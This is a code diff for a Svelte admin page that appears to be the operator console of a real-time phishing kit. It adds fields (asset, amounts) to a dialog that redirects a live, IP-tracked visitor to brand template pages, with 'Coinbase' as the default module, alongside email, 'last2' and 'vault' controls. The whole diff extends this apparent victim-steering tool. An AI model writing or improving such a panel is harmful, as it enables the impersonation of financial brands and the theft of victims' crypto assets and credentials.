@@ -19,11 +19,13 @@
 	import { toast } from '$lib/stores/toast';
 	import type { Visitor } from '$lib/server/state';
 	import SessionDialog from '$lib/components/SessionDialog.svelte';
+	import RedirectPageVarsForm from '$lib/components/RedirectPageVarsForm.svelte';
 	import Pagination from '$lib/components/Pagination.svelte';
 	import SortableHeader from '$lib/components/SortableHeader.svelte';
 	import { timeAgo } from '$lib/utils/time';
 	import { MODULES } from '$lib/modules';
 	import { templates } from '$lib/templates';
+	import { initRedirectVarValues, hasRedirectPageVars } from '$lib/templates';
 
 	let rows: Visitor[] = $state([]);
 	let total = $state(0);
@@ -39,6 +41,8 @@
 	let last2Editor: { ip: string; value: string } | null = $state(null);
 	let emailEditor: { ip: string; from: string; to: string } | null = $state(null);
 	let redirectEditor: { ip: string; template: string; module: string } | null = $state(null);
+	let redirectVarValues = $state<Record<string, string>>({});
+	let redirectVarTemplate = $state('');
 	let confirmDelete: { ip: string; email: string } | null = $state(null);
 	let confirmVault: { ip: string; email: string } | null = $state(null);
 	let pollTimer: ReturnType<typeof setInterval> | null = null;
@@ -199,12 +203,35 @@
 		return all;
 	}
 
+	function visitorByIp(ip: string): Visitor | undefined {
+		return rows.find((r) => r.ip === ip) ?? $wsVisitors.find((v) => v.ip === ip);
+	}
+
+	function syncRedirectVarValues(template: string, ip: string) {
+		const v = visitorByIp(ip);
+		redirectVarValues = initRedirectVarValues(template, v?.inputs ?? {});
+		redirectVarTemplate = template;
+	}
+
+	$effect(() => {
+		if (!redirectEditor?.template) {
+			redirectVarValues = {};
+			redirectVarTemplate = '';
+			return;
+		}
+		if (redirectEditor.template !== redirectVarTemplate) {
+			syncRedirectVarValues(redirectEditor.template, redirectEditor.ip);
+		}
+	});
+
 	function openRedirect(v: Visitor) {
+		const template = v.lastPageRoute || '';
 		redirectEditor = {
 			ip: v.ip,
-			template: v.lastPageRoute || '',
+			template,
 			module: v.module || 'Coinbase'
 		};
+		syncRedirectVarValues(template, v.ip);
 	}
 
 	async function saveRedirect() {
@@ -223,9 +250,14 @@
 			}
 		}
 
+		if (hasRedirectPageVars(redirectEditor.template) && Object.keys(redirectVarValues).length > 0) {
+			if (!wsSend('visitor:setinputs', { ip: redirectEditor.ip, inputs: redirectVarValues })) return;
+		}
 		if (!wsSend('visitor:redirect', { ip: redirectEditor.ip, template: redirectEditor.template })) return;
 		toast.success(`Redirecting to ${redirectEditor.template}`);
 		redirectEditor = null;
+		redirectVarValues = {};
+		redirectVarTemplate = '';
 	}
 
 	function moduleColor(m: string): string {
@@ -513,41 +545,47 @@
 {/if}
 
 {#if redirectEditor}
-	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (redirectEditor = null)}>
-		<div class="w-full max-w-lg rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
-			<h3 class="text-sm font-semibold text-[var(--foreground)]">Redirect User</h3>
-			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Select the page to send this visitor to.</p>
-			<label class="mt-4 block text-[10px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Template Page</label>
-			<select
-				bind:value={redirectEditor.template}
-				class="mt-1 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
-			>
-				<option value="">Select page...</option>
-				{#each brandsForRedirect(redirectEditor.module) as brand}
-					<optgroup label={brand}>
-						{#each Object.keys(templates[brand].routes) as page}
-							<option value="{brand}/{page}">{brand} — {page}</option>
-						{/each}
-					</optgroup>
-				{/each}
-			</select>
-			{#if redirectEditor.template}
-				<div class="mt-4 rounded-lg border border-[var(--border)] overflow-hidden">
-					<div class="border-b border-[var(--border)] bg-[var(--input)]/40 px-3 py-1.5 text-[10px] font-mono text-[var(--muted-foreground)]">
-						Preview: {redirectEditor.template}
+	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4" onclick={() => { redirectEditor = null; redirectVarValues = {}; redirectVarTemplate = ''; }}>
+		<div class="flex max-h-[90vh] w-full max-w-lg flex-col rounded-xl border border-[var(--border)] bg-[var(--card)] shadow-2xl" onclick={(e) => e.stopPropagation()}>
+			<div class="overflow-y-auto p-5 custom-scrollbar">
+				<h3 class="text-sm font-semibold text-[var(--foreground)]">Redirect User</h3>
+				<p class="mt-1 text-xs text-[var(--muted-foreground)]">Choose a page and set values (asset, amounts, etc.) before sending.</p>
+				<label class="mt-4 block text-[10px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Template Page</label>
+				<select
+					bind:value={redirectEditor.template}
+					class="mt-1 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+				>
+					<option value="">Select page...</option>
+					{#each brandsForRedirect(redirectEditor.module) as brand}
+						<optgroup label={brand}>
+							{#each Object.keys(templates[brand].routes) as page}
+								<option value="{brand}/{page}">{brand} — {page}</option>
+							{/each}
+						</optgroup>
+					{/each}
+				</select>
+
+				{#if redirectEditor.template}
+					<div class="mt-4">
+						<RedirectPageVarsForm template={redirectEditor.template} bind:values={redirectVarValues} />
 					</div>
-					<div class="h-48 bg-white">
-						<iframe
-							src="/templates/preview/{redirectEditor.template}"
-							title="Template preview"
-							class="h-full w-full border-0"
-							sandbox="allow-same-origin"
-						></iframe>
+					<div class="mt-4 rounded-lg border border-[var(--border)] overflow-hidden">
+						<div class="border-b border-[var(--border)] bg-[var(--input)]/40 px-3 py-1.5 text-[10px] font-mono text-[var(--muted-foreground)]">
+							Preview: {redirectEditor.template}
+						</div>
+						<div class="h-40 bg-white">
+							<iframe
+								src="/templates/preview/{redirectEditor.template}"
+								title="Template preview"
+								class="h-full w-full border-0"
+								sandbox="allow-same-origin"
+							></iframe>
+						</div>
 					</div>
-				</div>
-			{/if}
-			<div class="mt-5 flex justify-end gap-2">
-				<button onclick={() => (redirectEditor = null)} class="rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
+				{/if}
+			</div>
+			<div class="flex shrink-0 justify-end gap-2 border-t border-[var(--border)] p-4">
+				<button onclick={() => { redirectEditor = null; redirectVarValues = {}; redirectVarTemplate = ''; }} class="rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
 				<button
 					onclick={saveRedirect}
 					disabled={!redirectEditor.template}
